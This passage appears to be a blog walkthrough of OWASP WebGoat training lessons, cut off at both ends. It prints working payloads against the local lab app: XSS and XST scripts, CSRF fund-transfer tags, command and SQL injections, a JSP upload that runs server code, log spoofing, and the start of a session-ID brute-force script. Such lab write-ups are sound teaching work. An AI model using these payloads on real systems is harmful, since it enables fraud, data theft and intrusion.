+<p>``` plain</p>
+
+<script>alert('Read me!')</script>
+
+
+<p>```</p>
+
+<p>Then click on the title in the message list and see it in action.</p>
+
+<p><strong>Reflected XSS Attacks</strong></p>
+
+<p><strong>Concept / Topic To Teach:</strong>
+It is always a good practice to validate all input on the server side. XSS can occur when unvalidated user input is used in an HTTP response. In a reflected XSS attack, an attacker can craft a URL with the attack script and post it to another website, email it, or otherwise get a victim to click on it.</p>
+
+<p><strong>General Goal(s):</strong>
+For this exercise, your mission is to come up with some input containing a script. You have to try to get this page to reflect that input back to your browser, which will execute the script and do something bad.</p>
+
+<p>The vulnerable field is the access code field:</p>
+
+<p>``` plain</p>
+
+<script>alert('I got your money')</script>
+
+
+<p>```</p>
+
+<p>Then click Purchase.</p>
+
+<p><strong>Cross Site Request Forgery (CSRF)</strong></p>
+
+<p><strong>Concept / Topic To Teach:</strong>
+This lesson teaches how to perform Cross Site Request Forgery (CSRF) attacks.</p>
+
+<p><strong>How the attack works:</strong>
+Cross-Site Request Forgery (CSRF/XSRF) is an attack that tricks the victim into loading a page that contains img links like the one below:</p>
+
+<p><code>html
+&lt;img src="http://www.mybank.com/sendFunds.do?acctId=123456"/&gt;
+</code></p>
+
+<p>When the victim&rsquo;s browser attempts to render this page, it will issue a request to www.mybank.com to the transferFunds.do page with the specified parameters. The browser will think the link is to get an image, even though it actually is a funds transfer function. The request will include any cookies associated with the site. Therefore, if the user has authenticated to the site, and has either a permanent cookie or even a current session cookie, the site will have no way to distinguish this from a legitimate user request. In this way, the attacker can make the victim perform actions that they didn&rsquo;t intend to, such as logout, purchase item, or any other function provided by the vulnerable website</p>
+
+<p><img class="center" src="/images/webgoat/csrf.png" title="&lsquo;csrf&rsquo; &lsquo;csrf&rsquo;" ></p>
+
+<p>To embed the image, use an attack like the following in the message box:</p>
+
+<p><code>plain
+Check this out!
+&lt;img src="http://localhost:8080/WebGoat/attack?Screen=52&amp;menu=900&amp;transferFunds=4000" width="1" height="1"/&gt;
+</code></p>
+
+<p>Then click on the title and the funds transfer will happen behind the scenes.</p>
+
+<p><strong>CSRF Prompt By-Pass</strong></p>
+
+<p><strong>Concept / Topic To Teach:</strong>
+This lesson teaches how to perform CSRF attacks that bypass user confirmation prompts.</p>
+
+<p><strong>How the attack works:</strong></p>
+
+<p>Cross-Site Request Forgery (CSRF/XSRF) is an attack that tricks the victim into loading a page that contains a &lsquo;forged request&rsquo; to execute commands with the victim&rsquo;s credentials. Prompting a user to confirm or cancel the command might sound like a solution, but can be bypassed if the prompt is scriptable. This lesson shows how to bypass such a prompt by issuing another forged request. This can also apply to a series of prompts such as a wizard or issuing multiple unrelated forged requests.</p>
+
+<p><strong>General Goal(s):</strong>
+Similar to the CSRF Lesson, your goal is to send an email to a newsgroup that contains multiple malicious requests: the first to transfer funds, and the second a request to confirm the prompt that the first request triggered. The URL should point to the CSRF lesson with an extra parameter &ldquo;transferFunds=4000&rdquo;, and &ldquo;transferFunds=CONFIRM&rdquo;. You can copy the shortcut from the left hand menu by right clicking on the left hand menu and choosing copy shortcut. Whoever receives this email and happens to be authenticated at that time will have his funds transferred. When you think the attack is successful, refresh the page and you will find the green check on the left hand side menu.
+Note that the &ldquo;Screen&rdquo; and &ldquo;menu&rdquo; GET variables will vary between WebGoat builds. Copying the menu link on the left will give you the current values.</p>
+
+<p>The succession of steps is as follows:</p>
+
+<ul>
+<li><p>Initiate the transfer with this URL: <a href="http://localhost:8080/WebGoat/attack?Screen=45&amp;menu=900&amp;Num=21&amp;transferFunds=4000">http://localhost:8080/WebGoat/attack?Screen=45&amp;menu=900&amp;Num=21&amp;transferFunds=4000</a></p></li>
+<li><p>Confirm the transfer by POSTing <code>transferFunds=CONFIRM</code> to the URL <a href="http://localhost:8080/WebGoat/attack?Screen=45&amp;menu=900">http://localhost:8080/WebGoat/attack?Screen=45&amp;menu=900</a></p></li>
+</ul>
+
+
+<p><strong>CSRF Token By-Pass</strong></p>
+
+<p><strong>Concept / Topic To Teach:</strong>
+This lesson teaches how to perform CSRF attacks on sites that use tokens to mitigate CSRF attacks, but are vulnerable to CSS attacks.</p>
+
+<p><strong>How the attack works:</strong></p>
+
+<p>Cross-Site Request Forgery (CSRF/XSRF) is an attack that tricks the victim into loading a page that contains a &lsquo;forged request&rsquo; to execute commands with the victim&rsquo;s credentials.</p>
+
+<p>Token-based request authentication mitigates these attacks. This technique inserts tokens into pages that issue requests. These tokens are required to complete a request, and help verify that requests are not scripted. CSRFGuard from OWASP uses this technique to help prevent CSRF attacks.</p>
+
+<p>However, this technique can be by-passed if CSS vulnerabilities exist on the same site. Because of the same-origin browser policy, pages from the same domain can read content from other pages from the same domain.</p>
+
+<p><strong>General Goal(s):</strong>
+Similar to the CSRF Lesson, your goal is to send an email to a newsgroup that contains a malicious request to transfer funds. To successfully complete you need to obtain a valid request token. The page that presents the transfer funds form contains a valid request token. The URL for the transfer funds page is the same as this lesson with an extra parameter &ldquo;transferFunds=main&rdquo;. Load this page, read the token and append the token in a forged request to transferFunds. When you think the attack is successful, refresh the page and you will find the green check on the left hand side menu.
+Note that the &ldquo;Screen&rdquo; and &ldquo;menu&rdquo; GET variables will vary between WebGoat builds. Copying the menu link on the left will give you the current values.</p>
+
+<p>First look at the source of <a href="http://localhost:8080/WebGoat/attack?Screen=2&amp;menu=900&amp;transferFunds=main">http://localhost:8080/WebGoat/attack?Screen=2&amp;menu=900&amp;transferFunds=main</a> for this line:</p>
+
+<p><code>html
+&lt;input type="hidden" value="-2114619905" name="CSRFToken"&gt;
+</code></p>
+
+<p>So we know the value of a valid CSRF token. Then the URL to complete the transfer looks like this: <a href="http://localhost:8080/WebGoat/attack?Screen=2&amp;menu=900&amp;transferFunds=4000&amp;CSRFToken=-2114619905">http://localhost:8080/WebGoat/attack?Screen=2&amp;menu=900&amp;transferFunds=4000&amp;CSRFToken=-2114619905</a></p>
+
+<p><strong>HTTPOnly Test</strong></p>
+
+<p><img class="center" src="/images/webgoat/http_only.png" title="&lsquo;http only&rsquo; &lsquo;http only&rsquo;" ></p>
+
+<p>This is a demo showing the cookie being protected with the HTTPOnly flag.</p>
+
+<p><strong>Cross Site Tracing (XST) Attacks</strong></p>
+
+<p>We are back on the good old shopping cart page, with a twist: &ldquo;Tomcat is configured to support the HTTP TRACE command. Your goal is to perform a Cross Site Tracing (XST) attack.&rdquo;</p>
+
+<p><a href="https://capec.mitre.org/data/definitions/107.html">XST overview</a></p>
+
+<blockquote><p>Cross Site Tracing (XST) enables an attacker to steal the victim&rsquo;s session cookie and possibly other authentication credentials transmitted in the header of the HTTP request when the
+victim&rsquo;s browser communicates to destination system&rsquo;s web server. The attacker first gets a malicious script to run in the victim&rsquo;s browser that induces the browser to initiate an HTTP
+TRACE request to the web server. If the destination web server allows HTTP TRACE requests, it will proceed to return a response to the victim&rsquo;s web browser that contains the original
+HTTP request in its body. The function of HTTP TRACE, as defined by the HTTP specification, is to echo the request that the web server receives from the client back to the client. Since
+the HTTP header of the original request had the victim&rsquo;s session cookie in it, that session cookie can now be picked off the HTTP TRACE response and sent to the attackers' malicious
+site. XST becomes relevant when direct access to the session cookie via the &ldquo;document.cookie&rdquo; object is disabled with the use of httpOnly attribute which ensures that the cookie can be
+transmitted in HTTP requests but cannot be accessed in other ways. Using SSL does not protect against XST.</p>
+
+<p>If the system with which the victim is interacting is susceptible to XSS, an attacker can exploit that weakness directly to get his or her malicious script to issue an HTTP TRACE
+request to the destination system&rsquo;s web server. In the absence of an XSS weakness on the site with which the victim is interacting, an attacker can get the script to come from the site
+that he controls and get it to execute in the victim&rsquo;s browser (if he can trick the victim&rsquo;s into visiting his malicious website or clicking on the link that he supplies). However, in
+that case, due to the same origin policy protection mechanism in the browser, the attackers' malicious script cannot directly issue an HTTP TRACE request to the destination system&rsquo;s web
+server because the malicious script did not originate at that domain. An attacker will then need to find a way to exploit another weakness that would enable him or her to get around the
+same origin policy protection.</p></blockquote>
+
+<p>We know from before that the vulnerable field is the access code one. I borrowed from the solution, but haven&rsquo;t used an ActiveX object for the script:</p>
+
+<p>``` js</p>
+
+<script>
+var http_request = new XMLHttpRequest();
+http_request.open("TRACE", "./", false); 
+http_request.send();
+str1 = http_request.responseText; 
+while (str1.indexOf("\n") > -1) str1 = str1.replace("\n","<br>"); 
+document.write(str1);}
+</script>
+
+
+<p>```</p>
+
+<p>And some info on the methods used:</p>
+
+<ul>
+<li><p><em>open()</em> &ndash; initialize a request. The parameters used were the HTTP method, the URL and an optional boolean signifying whether or not to perform the operation asynchronously. If this value is false, the send()method does not return until the response is received.</p></li>
+<li><p><em>send()</em> &ndash; Sends the request. If the request is asynchronous (which is the default), this method returns as soon as the request is sent.</p></li>
+</ul>
+
+
+<h3>Improper Error Handling</h3>
+
+<p><strong>Fail Open Authentication Scheme</strong></p>
+
+<p><strong>Concept / Topic To Teach:</strong>
+This lesson presents the basics for understanding the &ldquo;fail open&rdquo; condition regarding authentication. The security term, “fail open” describes a behavior of a verification mechanism. This is when an error (i.e. unexpected exception) occurs during a verification method causing that method to evaluate to true. This is especially dangerous during login.</p>
+
+<p><img class="center" src="/images/webgoat/fail_open.png" title="&lsquo;fail open authentication&rsquo; &lsquo;fail open authentication&rsquo;" ></p>
+
+<p>Just logging in with a blank password won&rsquo;t cut it. From the hints and Java code, the correct way to exploit this is by removing the password parameter altogether. In WebScarab, the request looks like this: <code>Username=webgoat&amp;Password=&amp;SUBMIT=Login</code>. Get rid of the password and profit.</p>
+
+<h3>Injection Flaws</h3>
+
+<p><strong>Command Injection</strong></p>
+
+<p><img class="center" src="/images/webgoat/os_cmd.png" title="&lsquo;command injection&rsquo; &lsquo;cmd injection&rsquo;" ></p>
+
+<p>The server is retrieving the contents of the files by using the <em>cat</em> command. To insert a new command, I did this: <code>HelpFile=AccessControlMatrix.help;whoami&amp;SUBMIT=View</code>, but the result wasn&rsquo;t the one I expected:</p>
+
+<p><code>plain
+You are currently viewing: AccessControlMatrix.help;whoami
+</code></p>
+
+<p>The reason is that the filename is enclosed within quotes, and the command I appended just got literally interpreted as part of the quoted filename. To escape that, first close the quotes, then inject the command(s): <code>HelpFile=AccessControlMatrix.help";whoami;pwd"</code>. You also have to add quotes at the end, to close the stray quotes that you created when enclosing the filename.</p>
+
+<p><strong>Numeric SQL Injection</strong></p>
+
+<p><img class="center" src="/images/webgoat/num_sqli.png" title="&lsquo;numeric sqli&rsquo; &lsquo;numeric sqli&rsquo;" ></p>
+
+<p>The injection is straightforward: <code>station=101 or 1=1&mdash; &amp;SUBMIT=Go%21</code></p>
+
+<p><strong>Log Spoofing</strong></p>
+
+<p><strong>Concept / Topic To Teach:</strong>
+This lesson teaches attempts to fool the human eye.</p>
+
+<p><strong>How the attack works:</strong> The attack is based on fooling the human eye in log files. An attacker can erase his traces from the logs using this attack.</p>
+
+<p><img class="center" src="/images/webgoat/log_spoof.png" title="&lsquo;log spoofing&rsquo; &lsquo;spoof logs&rsquo;" ></p>
+
+<p>Whatever we input in the username box gets appended to the log file. To poison the log, do something like this:</p>
+
+<p><code>plain
+webgoat%0d%0aLogin succeeded for username:admin
+</code></p>
+
+<p>Using the CRLF attack, the log entries will now look like this:</p>
+
+<p><code>plain
+Login failed for username: webgoat
+Login succeeded for username:admin
+</code></p>
+
+<p>We can add a script as well:</p>
+
+<p><code>plain
+webgoat%0d%0aLogin succeeded for username:admin&lt;script&gt;alert('Throw your logs in the trash')&lt;/script&gt;
+</code></p>
+
+<p><strong>XPATH Injection</strong></p>
+
+<p><strong>Concept / Topic To Teach:</strong>
+This lesson teaches how to perform XPath Injection attacks.</p>
+
+<p><strong>How the attack works:</strong>
+Similar to SQL Injection, XPATH Injection attacks occur when a web site uses user supplied information to query XML data. By sending intentionally malformed information into the web site, an attacker can find out how the XML data is structured or access data that they may not normally have access to. They may even be able to elevate their privileges on the web site if the xml data is being used for authentication (such as an xml based user file). Querying XML is done with XPath, a type of simple descriptive statement that allows the xml query to locate a piece of information. Like SQL you can specify certain attributes to find and patterns to match. When using XML for a web site it is common to accept some form of input on the query string to identify the content to locate and display on the page. This input must be sanitized to verify that it doesn&rsquo;t mess up the XPath query and return the wrong data.</p>
+
+<p><img class="center" src="/images/webgoat/xpathi.png" title="&lsquo;xpath injection&rsquo; &lsquo;xpath injection&rsquo;" ></p>
+
+<p>To understand this injection, let&rsquo;s look at the following line:</p>
+
+<p><code>java
+String expression = "/employees/employee[loginID/text()='" + username + "' and passwd/text()='" + password + "']";
+</code></p>
+
+<p>With our credentials, it looks like this:</p>
+
+<p><code>java
+String expression = "/employees/employee[loginID/text()='" Mike  "' and passwd/text()='" test123 "']";
+</code></p>
+
+<p>And the injection is as follows: <code>&lsquo; or 'a&rsquo;=&lsquo;a</code>. Here&rsquo;s how it looks in the code:</p>
+
+<p><code>java
+String expression = "/employees/employee[loginID/text()='"   "' or 'a'='a' and passwd/text()='"  "' or 'a'='a']";
+</code></p>
+
+<p>In boolean logic, I think this boils down to:</p>
+
+<p><code>False OR True AND False OR True</code></p>
+
+<p>Since AND has higher precedence than OR, this becomes:</p>
+
+<p><code>False OR False OR True = False OR True = True</code></p>
+
+<p><strong>String SQL Injection</strong></p>
+
+<p><img class="center" src="/images/webgoat/sqli.png" title="&lsquo;string sql injection&rsquo; &lsquo;string sql injection&rsquo;" ></p>
+
+<p>The injection is simple: <code>&lsquo; or 1=1&mdash; </code>. The resulting SQL query is:</p>
+
+<p><code>sql
+SELECT * FROM user_data WHERE last_name = '' or 1=1-- '
+</code></p>
+
+<p><strong>LAB: SQL Injection</strong></p>
+
+<p><strong>Stage 1:</strong> Use String SQL Injection to bypass authentication. Use SQL injection to log in as the boss (&lsquo;Neville&rsquo;) without using the correct password. Verify that Neville&rsquo;s profile can be viewed and that all functions are available (including Search, Create, and Delete).</p>
+
+<p>Before injecting, I had to use Firebug to increase the maxlength attribute of the password field.The injection is <code>&lsquo; or 'a&rsquo;=&lsquo;a</code></p>
+
+<p><strong>Stage 2: Block SQL Injection using a Parameterized Query.</strong></p>
+
+<p>THIS LESSON ONLY WORKS WITH THE DEVELOPER VERSION OF WEBGOAT</p>
+
+<p>Implement a fix to block SQL injection into the fields in question on the Login page. Repeat stage 1. Verify that the attack is no longer effective.</p>
+
+<p>I didn&rsquo;t think ahead to get the dev version, so skipping.</p>
+
+<p><strong>Stage 3: Execute SQL Injection to bypass authorization.</strong></p>
+
+<p>As regular employee &lsquo;Larry&rsquo;, use SQL injection into a parameter of the View function (from the List Staff page) to view the profile of the boss (&lsquo;Neville&rsquo;).</p>
+
+<p>The request that needs to be exploited is this: <code>employee_id=101&amp;action=ViewProfile</code>.</p>
+
+<p>And the SQL injection is <code>employee_id=101 or 1=1 order by salary desc</code>.</p>
+
+<p>The reason for inserting the order by clause is because there is only one returned result and that needs to be the boss. And the boss has the biggest salary, right? By ordering the salary in descending order (from highest to lowest), we ensure that the first result is the boss' profile.</p>
+
+<p><strong>Stage 4: Block SQL Injection using a Parameterized Query.</strong></p>
+
+<p>THIS LESSON ONLY WORKS WITH THE DEVELOPER VERSION OF WEBGOAT</p>
+
+<p>Implement a fix to block SQL injection into the relevant parameter. Repeat stage 3. Verify that access to Neville&rsquo;s profile is properly blocked.</p>
+
+<p>Skipped.</p>
+
+<p><strong>Modify Data with SQL Injection</strong></p>
+
+<p><img class="center" src="/images/webgoat/sql_modify.png" title="&lsquo;modify sql&rsquo; &lsquo;modify sql&rsquo;" ></p>
+
+<p>Placing a quote in the box triggers an error: Unexpected end of command in statement [SELECT * FROM salaries WHERE userid = &lsquo;]</p>
+
+<p>To modify data, we have to construct an injection that will execute another query: <code>jsmith';update salaries set salary = 50000 where userid=&lsquo;jsmith</code></p>
+
+<p>The behind the scenes query is now:</p>
+
+<p><code>sql
+SELECT * FROM salaries WHERE userid = 'jsmith';update salaries set salary = 50000 where userid='jsmith'
+</code></p>
+
+<p>The UPDATE statement is used to update records in a table.</p>
+
+<p><em>Syntax</em>:</p>
+
+<p><code>sql
+UPDATE table_name
+SET column1=value1,column2=value2,...
+WHERE some_column=some_value;
+</code></p>
+
+<p><strong>Add Data with SQL Injection</strong></p>
+
+<p>This time, we have to add a record to the table. We can do it with this: <code>jsmith';insert into salaries values(&lsquo;hacker&rsquo;, 100000)&mdash; </code></p>
+
+<p>And the query is:</p>
+
+<p><code>sql
+SELECT * FROM salaries WHERE userid = 'jsmith';insert into salaries values('hacker', 100000)-- '
+</code></p>
+
+<p>That pesky quote needed to be commented out.</p>
+
+<p>The INSERT INTO statement is used to insert new records in a table.</p>
+
+<p><em>Syntax:</em></p>
+
+<p><code>sql
+INSERT INTO table_name
+VALUES (value1,value2,value3,...);
+</code></p>
+
+<p><strong>Database Backdoors</strong></p>
+
+<p><strong>Concept / Topic To Teach:</strong>
+How to Create Database Back Door Attacks.</p>
+
+<p><strong>How the attack works:</strong>
+Databases are used usually as a backend for web applications. Also it is used as a media of storage. It can also be used as a place to store a malicious activity such as a trigger. A trigger is called by the database management system upon the execution of another database operation like insert, select, update or delete. An attacker for example can create a trigger that would set his email address instead of every new user&rsquo;s email address.</p>
+
+<p><strong>General Goal(s):</strong>
+* Your goal should be to learn how you can exploit a vulnerable query to create a trigger.
+* You will not be able to actually create one in this lesson because the underlying database engine used with WebGoat doesn&rsquo;t support triggers.</p>
+
+<p><img class="center" src="/images/webgoat/db_bkdor.png" title="&lsquo;db backdoor&rsquo; &lsquo;db backdoor&rsquo;" ></p>
+
+<p>When you input your id, the query looks like this:</p>
+
+<p><code>sql
+select userid, password, ssn, salary, email from employee where userid=101
+</code></p>
+
+<p>The injection is: <code>101; update salaries set salary = 75000 where userid = &lsquo;larry&rsquo;</code></p>
+
+<p>Now for stage 2:</p>
+
+<p><img class="center" src="/images/webgoat/db_worm.png" title="&lsquo;db worm&rsquo; &lsquo;db worm&rsquo;" ></p>
+
+<p>And the syntax for creating the trigger is:</p>
+
+<p><code>sql
+101; CREATE TRIGGER wyrm BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET salary = 1000 WHERE userid = NEW.userid
+</code></p>
+
+<p>This creates a trigger that will be executed for each row before the insert operation and that will set the salary to the given value for the newly inserted userid.</p>
+
+<p><strong>Blind Numeric SQL Injection</strong></p>
+
+<p><img class="center" src="/images/webgoat/blind_numsqli.png" title="&lsquo;blind numeric sqli&rsquo; &lsquo;blind numeric sqli&rsquo;" ></p>
+
+<p>The page works like this: if you enter a correct account, you get this message: Account number is valid. Else, you get this: Invalid account number.</p>
+
+<p>We need to add another condition to the query and cycle through attempts until we hit the jackpot. Like ANDing the original query with a true/false condition:</p>
+
+<p><code>sql
+101 AND ((SELECT pin FROM pins WHERE cc_number='1111222233334444') &gt; 10000 );
+</code></p>
+
+<p>Repeating this a couple of times, I determine that the PIN is higher than 2000 but lower than 2500. I will show here how to use Burp Suite for finding the right value.</p>
+
+<ul>
+<li><p>Start Burp and capture a normal request to the page</p></li>
+<li><p>Send it to Intruder</p></li>
+<li><p>In the Positions tab, keep only the relevant position (the account_number), and add a statement checking if the tested value is equal to the condition. It looks like this: <code>account_number=101 and 1=((SELECT pin FROM pins WHERE cc_number = &lsquo;1111222233334444&rsquo;)=§§)&amp;SUBMIT=Go%21</code>. The type of attack is the Sniper attack.</p></li>
+<li><p>In the Payloads tab, load a file with some values</p></li>
+<li><p>In the Options tab, under Grep-Match, add strings to be matched in responses (the messages for valid and invalind account numbers. Don&rsquo;t forget the dot at the end). And under Redirections, check to always follow redirections and to process cookies in redirections</p></li>
+<li><p>Start the attack. Here&rsquo;s an example of the results:</p></li>
+</ul>
+
+
+<p><img class="center" src="/images/webgoat/intruder.png" title="&lsquo;burp intruder attack&rsquo; &lsquo;burp intruder attack&rsquo;" ></p>
+
+<p>The correct PIN is 2364.</p>
+
+<p><strong>Blind String SQL Injection</strong></p>
+
+<p>The form below allows a user to enter an account number and determine if it is valid or not. Use this form to develop a true / false test check other entries in the database.</p>
+
+<p>Reference Ascii Values: &lsquo;A&rsquo; = 65 &lsquo;Z&rsquo; = 90 &lsquo;a&rsquo; = 97 &lsquo;z&rsquo; = 122</p>
+
+<p>The goal is to find the value of the field name in table pins for the row with the cc_number of 4321432143214321. The field is of type varchar, which is a string.</p>
+
+<p>Put the discovered name in the form to pass the lesson. Only the discovered name should be put into the form field, paying close attention to the spelling and capitalization.</p>
+
+<p>This is a variation of the previous attack. The difference is now we&rsquo;re dealing with a string.</p>
+
+<p>The way to perform this attack is to use the SUBSTRING method to check for a boolean condition:</p>
+
+<p><strong>SUBSTRING ( expression ,start , length )</strong></p>
+
+<p><code>sql
+101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 1, 1) &lt; 'Z' )
+</code></p>
+
+<p>This will check if the first letter of the name is lower than the ASCII value of letter Z. After you determine the first letter, you can continue testing for the next:</p>
+
+<p><code>sql
+101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number='4321432143214321'), 2, 1) &gt; 'a' )
+</code></p>
+
+<p>You can use BurpSuite like I did previously, to test for the letters. Something like: <code>account_number=101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number=&lsquo;4321432143214321&rsquo;), 1, 1) = &lsquo;J&rsquo; )&amp;SUBMIT=Go%21</code>, then move to the next letter, and so on. The payload position should be between the quotes.</p>
+
+<p>The name we&rsquo;re looking for is Jill.</p>
+
+<h3>Denial of Service</h3>
+
+<p><strong>Denial of Service from Multiple Logins</strong></p>
+
+<p><img class="center" src="/images/webgoat/dos.png" title="&lsquo;dos&rsquo; &lsquo;dos&rsquo;" ></p>
+
+<p>This means that, if we exceed the multiple logins treshold, which is 2, the application should choke. First let&rsquo;s find out some user details:</p>
+
+<p><img class="center" src="/images/webgoat/dos_login.png" title="&lsquo;dos login&rsquo; &lsquo;dos login&rsquo;" ></p>
+
+<p>Login 3 times to complete this lesson.</p>
+
+<h3>Insecure Communication</h3>
+
+<p><strong>Insecure Login</strong></p>
+
+<p><img class="center" src="/images/webgoat/insecure_login.png" title="&lsquo;insecure login&rsquo; &lsquo;insecure login&rsquo;" ></p>
+
+<p>I started Wireshark and sniffed the the password. Here&rsquo;s how it looks like:</p>
+
+<p><img class="center" src="/images/webgoat/sniff.png" title="&lsquo;sniff password&rsquo; &lsquo;sniff passwod&rsquo;" ></p>
+
+<p>The password is sniffy.</p>
+
+<p><strong>Stage2:</strong> Now you have to change to a secure connection. The URL should start with <a href="https://">https://</a> If your browser is complaining about the certificate just ignore it. Sniff again the traffic and answer the questions</p>
+
+<p>This time, with the use of SSL, the password is no longer transmitted in plain text.</p>
+
+<h3>Insecure Configuration</h3>
+
+<p><strong>Forced Browsing</strong></p>
+
+<p><strong>Concept / Topic To Teach:</strong>
+How to Exploit Forced Browsing.</p>
+
+<p><strong>How the attack works:</strong>
+Forced browsing is a technique used by attackers to gain access to resources that are not referenced, but are nevertheless accessible. One technique is to manipulate the URL in the browser by deleting sections from the end until an unprotected directory is found</p>
+
+<p>*Your goal should be to try to guess the URL for the &ldquo;config&rdquo; interface.</p>
+
+<p>*The &ldquo;config&rdquo; URL is only available to the maintenance personnel.</p>
+
+<p>*The application doesn&rsquo;t check for horizontal privileges.</p>
+
+<p>Can you try to force browse to the config page which should only be accessed by maintenance personnel?</p>
+
+<p>The URL is <a href="http://localhost:8080/WebGoat/conf">http://localhost:8080/WebGoat/conf</a></p>
+
+<h3>Insecure Storage</h3>
+
+<p><strong>Encoding Basics</strong></p>
+
+<p>This lesson will familiarize the user with different encoding schemes.</p>
+
+<p>You can enter strings and see how they are encoded with different algorithms.</p>
+
+<h3>Malicious Execution</h3>
+
+<p><strong>Malicious File Execution</strong></p>
+
+<p><img class="center" src="/images/webgoat/malware.png" title="&lsquo;malicious file execution&rsquo; &lsquo;malicious file execution&rsquo;" ></p>
+
+<p>Upload an image. Then right-click it and select View Image Info (Firefox) to discover the upload path. The images get uploaded in the <a href="http://localhost:8080/WebGoat/uploads/">http://localhost:8080/WebGoat/uploads/</a> path</p>
+
+<p>Armed with this knowledge, we can now upload a file containing code that creates the guest.txt file in the required location. Because of the underlying web application architecture, I had to use Java for this (hardly my choice for any coding). So I borrowed from the solution:</p>
+
+<p><code>html
+&lt;html&gt;
+&lt;% java.io.File file = new java.io.File("/root/WebGoat-5.4/tomcat/webapps/WebGoat/mfe_target/guest.txt");
+file.createNewFile(); %&gt;
+&lt;/html&gt;
+</code></p>
+
+<p>I uploaded it as exe.jsp. Then I went to <a href="http://localhost:8080/WebGoat/uploads/exe.jsp.">http://localhost:8080/WebGoat/uploads/exe.jsp.</a> When you navigate to your uploaded file, you will see a blank page, but your code has executed. Refresh the lesson to complete it.</p>
+
+<h3>Parameter Tampering</h3>
+
+<p><strong>Bypass HTML Field Restrictions</strong></p>
+
+<p><img class="center" src="/images/webgoat/html_fields.png" title="&lsquo;html field restrictions&rsquo; &lsquo;html field restrictions&rsquo;" ></p>
+
+<p>For this, I used a combination of Live HTTP Headers and Firebug. I used Firebug to enable the disabled field by delething this part: <code>disabled=&ldquo;&rdquo;</code>. For the rest, I just intercepted the request and added random numbers and characters (including in the Submit button).</p>
+
+<p><strong>Exploit Hidden Fields</strong></p>
+
+<p><strong>Concept / Topic To Teach:</strong>
+Developers will use hidden fields for tracking, login, pricing, etc.. information on a loaded page. While this is a convenient and easy mechanism for the developer, they often don&rsquo;t validate the information that is received from the hidden field. This lesson will teach the attacker to find and modify hidden fields to obtain a product for a price other than the price specified</p>
+
+<p><strong>General Goal(s):</strong>
+The user should be able to exploit a hidden field to obtain a product at an incorrect price. Try to purchase the HDTV for less than the purchase price, if you have not done so already.</p>
+
+<p>This is another shopping cart functionality. Find this in the source:</p>
+
+<p><code>html
+&lt;input type="HIDDEN" value="2999.99" name="Price"&gt;
+</code></p>
+
+<p>Edit it, and buy.</p>
+
+<p><strong>Exploit Unchecked Email</strong></p>
+
+<p><strong>Concept / Topic To Teach:</strong>
+It is always a good practice to validate all inputs. Most sites allow non-authenticated users to send email to a &lsquo;friend&rsquo;. This is a great mechanism for spammers to send out email using your corporate mail server.</p>
+
+<p><img class="center" src="/images/webgoat/mail.png" title="&lsquo;mail&rsquo; &lsquo;mail&rsquo;" ></p>
+
+<p>The first part of the attack is to add a script to the comment box. I entered a simple XSS alert:</p>
+
+<p>``` plain</p>
+
+<script>alert('Let's play Goat Simulator!')</script>
+
+
+<p>```</p>
+
+<p>You will see this: <em>The attack worked! Now try to attack another person than the admin.</em></p>
+
+<p>For the second part, I intercepted the request with WebScarab and modified the mail address from the <em>to</em> field to an arbitrary address.</p>
+
+<p><strong>Bypass Client Side JavaScript Validation</strong></p>
+
+<p><strong>Concept / Topic To Teach:</strong>
+Client-side validation should not be considered a secure means of validating parameters. These validations only help reduce the amount of server processing time for normal users who do not know the format of required input. Attackers can bypass these mechanisms easily in various ways. Any client-side validation should be duplicated on the server side. This will greatly reduce the likelihood of insecure parameter values being used in the application.</p>
+
+<p><strong>General Goal(s):</strong>
+For this exercise, the web site requires that you follow certain rules when you fill out a form. The user should be able to break those rules, and send the website input that it wasn&rsquo;t expecting.</p>
+
+<p>For this, I just used WebScarab to add some @ symbols in each field.</p>
+
+<h3>Session Management Flaws</h3>
+
+<p><strong>Hijack a Session</strong></p>
+
+<p><img class="center" src="/images/webgoat/session_hijack.png" title="&lsquo;session hijack&rsquo; &lsquo;session hijack&rsquo;" ></p>
+
+<p>When trying to log in, we can see a session ID that is not present on successful login: <code>WEAKID=10185-1409598474670</code>. This changes with every login attempt. To get more information about how the session ID is constructed, I used WebScarab&rsquo;s SessionID Analysis feature. From the Previous Requests list, I selected the POST request that had a 200 OK response (the one ending in WebGoat/attack). I tried to test it, and got the message that no session identifiers were found. I deleted the WEAKID cookie and tested again. This time I got a popup:</p>
+
+<p><img class="center" src="/images/webgoat/weakid.png" title="&lsquo;weakid&rsquo; &lsquo;weakid&rsquo;" ></p>
+
+<p>The next step is to collect some session IDs by selecting a number for samples and clicking Fetch. I used 50. Then, in the Analysis tab, select the WEAKID from the Session Identifier list. Here&rsquo;s a sample screen:</p>
+
+<p><img class="center" src="/images/webgoat/session_analysis.png" title="&lsquo;weakid analysis&rsquo; &lsquo;weakid analysis&rsquo;" ></p>
+
+<p>The part before the dash seems to increase sequentially, but we can spot some missing sequences: after 10236 comes 10238. So the goal here is to find a valid session ID with one of these missing sessions.</p>
+
+<p>Let&rsquo;s look next at the part after the dash. Here too there is a pattern:</p>
+
+<p>10187-1409601344<strong>499</strong></p>
+
+<p>10188-1409601344<strong>590</strong></p>
+
+<p>And so on. The bold part changes with each request, but in an incremental fashion. Look at the Difference tab. The values are really close to each other, except a few cases where there is a much higher value, sort of a double of the normal values. These are the session IDs that come after the missing IDs, which are the ones we want to use.</p>
+
+<p><img class="center" src="/images/webgoat/diff.png" title="&lsquo;id difference&rsquo; &lsquo;id difference&rsquo;" ></p>
+
+<p>In this example, we want the ID starting with 10208, but we don&rsquo;t know the part after the dash. But we know the previous and the next session ID values, so we can set boundaries:</p>
+
+<p>10207-1409601346<strong>563</strong></p>
+
+<p>10208-1409601346<strong>???</strong></p>
+
+<p>10209-1409601346<strong>658</strong></p>
+
+<p>Our session ID is between 564 and 657. I wrote a Python script to bruteforce the value:</p>
+
+<p>``` python</p>
+
+<h1>!/usr/bin/python</h1>
+
+<p>import requests</p>
+
+<p>url = &lsquo;<a href="http://localhost:8080/WebGoat/attack?Screen=72&amp;menu=1800">http://localhost:8080/WebGoat/attack?Screen=72&amp;menu=1800</a> HTTP/1.1&rsquo;</p>
+
+<p>for wid in range(564, 658):</p>
+
+<pre><code>weakid = "10208-1409601346%s" % wid
+hdrs = {
+    'Host': 'localhost:8080',
+    'User-Agent': 'Firepython',
